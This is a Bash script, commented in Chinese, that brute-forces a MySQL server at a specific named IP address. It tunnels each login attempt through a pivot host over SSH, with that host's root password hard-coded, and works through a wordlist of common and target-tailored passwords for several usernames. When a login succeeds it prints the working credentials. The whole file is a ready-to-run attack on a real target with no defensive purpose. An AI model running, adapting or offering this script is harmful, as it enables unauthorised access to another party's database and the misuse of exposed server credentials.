#!/bin/bash
# MySQL 3306暴力破解脚本 - 完整可用版
# 目标: 172.104.189.60:3306

PIVOT_HOST="82.29.71.156"
PIVOT_PORT="2233"
PIVOT_USER="root"
PIVOT_PASS="@admin1314@"
TARGET_IP="172.104.189.60"
TARGET_PORT="3306"

echo "[+] MySQL暴力破解工具"
echo "[+] 目标: $TARGET_IP:$TARGET_PORT"
echo "[+] 通过Pivot: $PIVOT_HOST"
echo ""

# 生成密码字典
cat > /tmp/mysql_passwords.txt <<'EOF'
root
admin
password
123456
12345678
qwerty
abc123
password123
admin123
root123
P@ssw0rd
P@ssword
Password1
Admin123
Root123
magento
magento123
Magento123
9to9
9to9admin
9to9root
9to9@2024
9to9@2023
indonesia
indonesia123
Jakarta123
jakarta
singapore
Singapore123
linode
Linode123
mysql
mysql123
Mysql123
database
database123
db123
dbadmin
DBadmin123
webadmin
webadmin123
letmein
welcome
Welcome123
changeme
Changeme123
qwerty123
123qwe
1qaz2wsx
1q2w3e4r
pass
pass123
Pass123
test
test123
Test123
EOF

echo "[+] 生成密码字典: $(wc -l < /tmp/mysql_passwords.txt)个密码"
echo ""

# 用户列表
USERS="root admin magento mysql webadmin dbadmin dbuser web_user db_user"

# 开始破解
for USER in $USERS; do
    echo "[测试用户] $USER"
    
    while IFS= read -r PASS; do
        # 通过SSH到pivot主机执行MySQL连接测试
        RESULT=$(sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
            "timeout 3 mysql -h $TARGET_IP -P $TARGET_PORT -u '$USER' -p'$PASS' -e 'SELECT 1;' 2>&1")
        
        if echo "$RESULT" | grep -q "ERROR 1045"; then
            # 认证失败，继续
            echo -n "."
        elif echo "$RESULT" | grep -q "ERROR 2003"; then
            echo ""
            echo "[-] 连接超时，可能网络问题"
            exit 1
        else
            # 可能成功
            echo ""
            echo ""
            echo "================================"
            echo "[!!!] 可能成功！"
            echo "[!!!] 用户: $USER"
            echo "[!!!] 密码: $PASS"
            echo "================================"
            echo ""
            echo "验证命令:"
            echo "ssh -p 2233 root@82.29.71.156"
            echo "mysql -h $TARGET_IP -u $USER -p'$PASS'"
            echo ""
            exit 0
        fi
    done < /tmp/mysql_passwords.txt
    
    echo ""
done

echo ""
echo "[-] 所有密码尝试完毕，未找到有效凭证"
echo "[建议] 使用更大的字典（rockyou.txt等）"
